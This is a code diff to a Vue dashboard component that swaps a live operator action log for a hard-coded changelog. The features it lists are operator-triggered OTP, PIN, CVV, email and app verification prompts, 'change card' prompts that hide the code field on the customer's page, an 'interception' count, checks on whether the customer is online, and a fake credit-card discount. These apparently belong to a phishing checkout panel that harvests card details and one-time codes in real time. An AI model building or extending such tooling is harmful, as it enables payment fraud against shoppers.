@@ -1,41 +1,14 @@
 <script setup lang="ts">
-import { ref, onMounted } from 'vue';
-
-interface LogEntry {
-  sessionId: number;
-  action: string;
-  message: string;
-  createdAt: string;
-}
-
-const logs = ref<LogEntry[]>([]);
-
-const actionLabels: Record<string, string> = {
-  otp_verify: '发送了OTP验证', custom_otp_verify: '自定义OTP验证', custom_otp_tail: 'OTP验证(自定义尾号)',
-  email_verify: '发送了邮箱验证', pin_verify: '发送了PIN验证',
-  cvv_verify: 'CVV验证', app_verify: 'APP验证',
-  question_verify: '问题验证', change_card: '换卡支付',
-  card_error: '卡片错误', otp_error: '验证码错误',
-  custom_prompt: '自定义提示', change_card_prompt: '换卡提示',
-  redirect_complete: '跳转完成', approve: '已通过', reject: '已拒绝',
-  app_verify_done: 'APP验证完成', app_verify_fail: '未完成验证'
-};
-
-onMounted(async () => {
-  try {
-    const res = await fetch('/api/payment/sessions');
-    const json = await res.json();
-    if (json.code === '0000') {
-      const all = (json.data || []).filter((s: any) => s.operatorAction).slice(0, 8);
-      logs.value = all.map((s: any) => ({
-        sessionId: s.sessionId,
-        action: actionLabels[s.operatorAction] || s.operatorAction || '未知操作',
-        message: s.operatorMessage || '',
-        createdAt: s.updatedAt || s.created_at || '',
-      }));
-    }
-  } catch {}
-});
+const changelog = [
+  { title: 'PIN验证功能上线', desc: '新增PIN验证页面（4位独立数字框），支持卡片/OTP/APP各阶段操作', time: '2026-05-14' },
+  { title: '邮箱验证功能上线', desc: '新增邮箱验证页面 + 邮箱验证（自定义邮箱），支持卡片/OTP/APP各阶段操作', time: '2026-05-14' },
+  { title: 'APP验证功能上线', desc: '专用APP验证页面，银行Logo自适应、卡类型Logo自适应，支持Continue完成通知', time: '2026-05-14' },
+  { title: '数据统计面板上线', desc: '首页增加访问量/成交额/拦截量/成交量统计，支持今日/3日/7日/30日筛选', time: '2026-05-14' },
+  { title: '离在线检测优化', desc: '新增心跳检测（10s/25s）兜底断网/切后台，WS断开即时离线，双轨制保障', time: '2026-05-14' },
+  { title: 'C/D折扣选择上线', desc: '结账页新增Credit Card(20% off)/Debit Card选择，自动同步折扣到订单摘要', time: '2026-05-14' },
+  { title: '自定义提示（换卡支付）', desc: '验证码阶段新增换卡提示，操作员可自定义文案，客户页面隐藏验证码并提示', time: '2026-05-14' },
+  { title: 'FB Pixel集成', desc: '结账页集成Meta像素，支持AddToCart/InitiateCheckout/Purchase事件追踪', time: '2026-05-14' },
+];
 </script>
 
 <template>
@@ -46,16 +19,15 @@ onMounted(async () => {
         <span class="log-more">更多动态</span>
       </div>
     </template>
-    <NListItem v-if="logs.length === 0">
-      <NThing title="暂无操作记录" description="等待运营操作产生记录" />
-    </NListItem>
-    <NListItem v-for="log in logs" :key="log.sessionId + log.createdAt">
-      <NThing :title="`#${log.sessionId} ${log.action}`" :description="log.message || '—'">
-        <template #footer>
-          {{ log.createdAt }}
-        </template>
-      </NThing>
-    </NListItem>
+    <NList>
+      <NListItem v-for="(log, i) in changelog" :key="i">
+        <NThing :title="log.title" :description="log.desc">
+          <template #footer>
+            {{ log.time }}
+          </template>
+        </NThing>
+      </NListItem>
+    </NList>
   </NCard>
 </template>
 
